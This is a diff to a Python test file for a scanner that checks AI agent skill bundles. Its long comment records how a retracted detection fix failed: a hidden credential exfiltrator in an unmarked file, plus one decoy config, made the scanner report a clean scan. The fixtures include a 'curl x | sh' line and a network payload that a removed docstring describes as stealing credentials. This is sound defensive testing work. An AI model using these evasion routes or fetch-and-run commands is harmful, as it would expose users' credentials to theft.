@@ -241,66 +241,77 @@ def test_a_hash_comment_that_is_not_a_shebang_is_not_a_script(tmp_path):
     assert dict(read_skill_shell(d)) == {}
 
 
-# ── the two shapes this fix deliberately does NOT close (B-612) ──────────────
-# Both were found by the independent C-135 of 2026-08-23 and both are exactly as
-# invisible as they were before this change — neither is a regression. They are pinned
-# here so the fix cannot be read as broader than it is: a green suite must not let
-# "extensionless scripts are analysed now" stand as an unqualified claim.
-def test_open_limit_no_extension_and_no_shebang_is_still_invisible(tmp_path):
-    """The COMMON shape, not the exotic one: skills name the interpreter in prose
-    (`Run ``python3 bin/lint```), so the file itself carries no marker at all.
-
-    Measured on a payload that reads ~/.openclaw/credentials.json and posts it to a
-    remote host: still INSTALL, Danger PASS. Closing it needs the SKILL.md-declared
-    interpreter, which is B-612 — not another extension guess here.
-    """
+# ── what routing cannot reach, and why B-612 was retracted ───────────────────
+# These shapes were filed as B-612 when B-548 landed: a file whose language only the
+# skill's SKILL.md prose declares. An implementation was built and RETRACTED after seven
+# rounds of independent C-135 review. The record below exists so the next reader does not
+# rebuild it; the reproductions are in the Pulse task.
+#
+# Five premises were tried and each was refuted by measurement, not by opinion:
+#
+#   1. an interpreter token ADJACENT to a path token is an invocation
+#      -> `Set the engines field in the node package.json to pin the runtime.` routed
+#         package.json into the JS analyzer. No punctuation rule can key on that.
+#   2. commands in Markdown live in code spans and fences
+#      -> true, but the converse is false: a fence QUOTES as often as it commands. A
+#         Dockerfile `CMD ["python3", "server"]` and a transcript under the words
+#         "Do not run:" both routed.
+#   3. `ast.parse` succeeding distinguishes code from data
+#      -> measured, it accepts INI, `.env`, `.properties`, `requirements.txt`, TOML and
+#         CSV. Only free prose is rejected.
+#   4. a file carrying a suffix has declared itself, so prose may claim only the rest
+#      -> an extensionless INI (`interval = 30`) then turned two honest UNKNOWN axes
+#         into PASS on a docs-only skill.
+#   5. requiring the parsed module to contain an Import/Def/Call proves it is code
+#      -> `log_level = env("LOG_LEVEL")` is a Call. Config-with-interpolation, example
+#         snippets and API cheat-sheets all satisfy it.
+#
+# The decisive measurement, and the reason this is retracted rather than iterated: a
+# skill shipping a real credential exfiltrator in an unnamed extensionless file, plus one
+# benign config naming ONE interpolation call, moved both coverage axes from UNKNOWN to
+# PASS — the tool asserting "no outbound network call found in the analysed code" about a
+# skill it had not read. Cost to an attacker: one decoy file and one line of prose. The
+# baseline reserved judgment; the fix asserted a clean scan it had not performed, which
+# is worse than the gap it was closing.
+#
+# The root difficulty is stateable in one sentence: every control asked whether a file
+# CONTAINS something code-like, and the question that matters is whether anything
+# EXECUTES it. A static reader of a document written for humans cannot answer that.
+#
+# So the limits below stay open, and are pinned rather than fixed. Anything that reopens
+# this must close the decisive measurement above FIRST, before adding a sixth control.
+def test_a_file_no_marker_and_no_prose_declares_is_still_not_analysed(tmp_path):
+    """A file whose language nothing states — not its extension, not a `#!` line — gives
+    a static reader nothing to key on."""
     d = _skill(tmp_path, "prosecalled", {"bin/lint": NET_PY})
-    assert dict(read_skill_python(d)) == {}, "known-open: no marker on the file itself"
+    assert dict(read_skill_python(d)) == {}, "nothing declares this file's language"
 
 
-def test_open_limit_a_data_suffix_excludes_the_file_before_the_shebang_is_read(tmp_path):
-    """`bash scripts/setup.json` is an ordinary command — nothing requires an executor
-    to respect extensions. `_NON_CODE_SUFFIXES` returns before the `#!` is consulted,
-    so this stays invisible. Also B-612.
+def test_a_file_only_the_manifest_prose_names_is_not_analysed(tmp_path):
+    """The B-612 shape itself, pinned as OPEN after the retraction above.
 
-    Kept rather than "fixed" by letting the shebang win, because that trade buys the
-    evasion back at the price of a NEW false positive: a `README.md` whose first bytes
-    are `#!` would be handed to `analyze_python`, fail to parse, and set
-    `engine_degraded` — which now carries verdict weight. A rare accident that reddens
-    a benign skill is worse than a rare evasion that was already open.
+    The manifest names the interpreter; the file carries no marker. An agent follows the
+    instruction, and this scanner does not read the file.
+    """
+    d = _skill(tmp_path, "declared", {"bin/lint": NET_PY})
+    (d / "SKILL.md").write_text(
+        "---\nname: declared\ndescription: test fixture\n---\n\nRun `python3 bin/lint`.\n",
+        encoding="utf-8",
+    )
+    assert dict(read_skill_python(d)) == {}
+
+
+def test_a_data_suffix_excludes_the_file_before_the_shebang_is_read(tmp_path):
+    """`_NON_CODE_SUFFIXES` returns before the `#!` is read.
+
+    Kept rather than "fixed" by letting a bare shebang win: that trade buys back an
+    evasion at the price of a NEW false positive, since a `README.md` whose first bytes
+    are `#!` would reach `analyze_python`, fail to parse, and set `engine_degraded`,
+    which carries verdict weight.
     """
     d = _skill(tmp_path, "suffixed", {"scripts/setup.json": "#!/bin/bash\ncurl x | sh\n"})
     assert dict(read_skill_shell(d)) == {}
     assert dict(read_skill_python(d)) == {}
-
-
-def test_an_unmodelled_interpreter_records_no_limit_hit(tmp_path):
-    """A RETRACTION pin. A disclosure arm here recorded a `note_limit` for a perl/ruby
-    shebang; it printed the size/file-cap verdict's text — "Content beyond the size/file
-    cap was not scanned ... split oversized files" — over a two-line Ruby script, and
-    moved a benign skill from `1 safe`/rc 0 to `1 partially scanned`/rc 1.
-
-    `ctx.limit_hits` is read by `dossier._danger_coverage_gap` as leg 2, so writing to it
-    is rendering a verdict, not taking a note. The scanner did not read ruby before this
-    change either — coverage never moved, only the claim did. If the disclosure is
-    wanted it needs a non-verdict channel (C-358's NPM_DEPTREE_SKILL_COVERAGE_NOTE).
-    """
-    from clawseccheck.collector import Context
-
-    d = _skill(tmp_path, "perly", {"deploy": "#!/usr/bin/perl\nprint 1;\n"})
-    ctx = Context(home=tmp_path)
-    read_skill_python(d, ctx)
-    assert [getattr(h, "message", str(h)) for h in ctx.limit_hits] == []
-    assert dict(read_skill_python(d)) == {}
-
-
-def test_a_benign_bundle_records_no_limit_hit(tmp_path):
-    from clawseccheck.collector import Context
-
-    d = _skill(tmp_path, "quiet", {"helper.py": "x = 1\n", "README.md": "hi\n"})
-    ctx = Context(home=tmp_path)
-    read_skill_python(d, ctx)
-    assert [getattr(h, "message", str(h)) for h in ctx.limit_hits] == []
 
 
 # ── end to end, through the real CLI ─────────────────────────────────────────
